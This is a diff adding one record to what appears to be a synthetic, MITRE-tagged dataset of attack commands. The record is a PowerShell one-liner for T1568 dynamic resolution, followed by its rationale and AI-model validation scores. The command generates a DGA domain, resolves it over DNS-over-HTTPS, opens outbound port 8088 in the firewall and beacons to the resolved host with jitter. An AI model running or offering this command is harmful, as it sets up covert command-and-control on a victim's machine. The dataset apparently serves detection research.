@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $seed=(Get-Date).DayOfYear; $dom=('relay{0}{1}.syncnode.net' -f (Get-Random -Min 100 -Max 999),$seed); $doh=('https://cloudflare-dns.com/dns-query?name={0}&type=A' -f $dom); $json=(Invoke-WebRequest -Uri $doh -Headers @{ accept='application/dns-json' } -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json; $ip=$json.Answer | Where-Object { $_.type -eq 1 } | Select-Object -First 1 -ExpandProperty data; if($ip){ netsh advfirewall firewall add rule name='sys_out_8088' dir=out action=allow protocol=TCP remoteport=8088 | Out-Null; Start-Sleep -Milliseconds (Get-Random -Min 400 -Max 2200); Invoke-WebRequest -Uri ('http://{0}:8088/ping' -f $ip) -Headers @{ Host=$dom; 'User-Agent'='curl/7.79.1' } -TimeoutSec (Get-Random -Min 4 -Max 8) -UseBasicParsing } }",
+  "explanation": "Uses DNS-over-HTTPS to resolve a DGA domain to an IP, permits outbound 8088, introduces timing jitter, and contacts the resolved endpoint with a Host header to simulate virtual hosting.",
+  "rationale_steps": [
+    "Create a time-variant DGA domain.",
+    "Resolve the domain over DoH to blend with normal HTTPS.",
+    "Allow outbound on an uncommon port and add jitter to traffic timing.",
+    "Perform an HTTP check-in to the resolved IP with Host-based routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-cfd87873",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell scriptblock is well-formed with balanced delimiters, valid pipelines, hashtables, and parameters, making it fully parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates a domain and resolves it via DoH before contacting the resolved IP with jitter and a Host header (aligned with T1568), but the firewall rule change likely fails without admin rights and overall success depends on the domain resolving.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:30:10.973219Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced braces, parentheses, and quotes, valid cmdlet usage, proper string formatting operators, and correct pipeline/semicolon separators throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1568 dynamic resolution by combining a date-seeded DGA domain pattern with DNS-over-HTTPS (evading traditional DNS monitoring), firewall rule creation for port 8088, timing jitter for beaconing evasion, and a Host header spoofing virtual hosting — all operationally coherent and realistic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:19:05.369556Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command and its script block are syntactically correct, featuring balanced delimiters, valid cmdlet usage, and proper string formatting.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively demonstrates DGA logic and DoH resolution, but the inclusion of a firewall modification via 'netsh' contradicts the 'Privilege: None' metadata as it requires administrative rights.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:19:11.871668Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
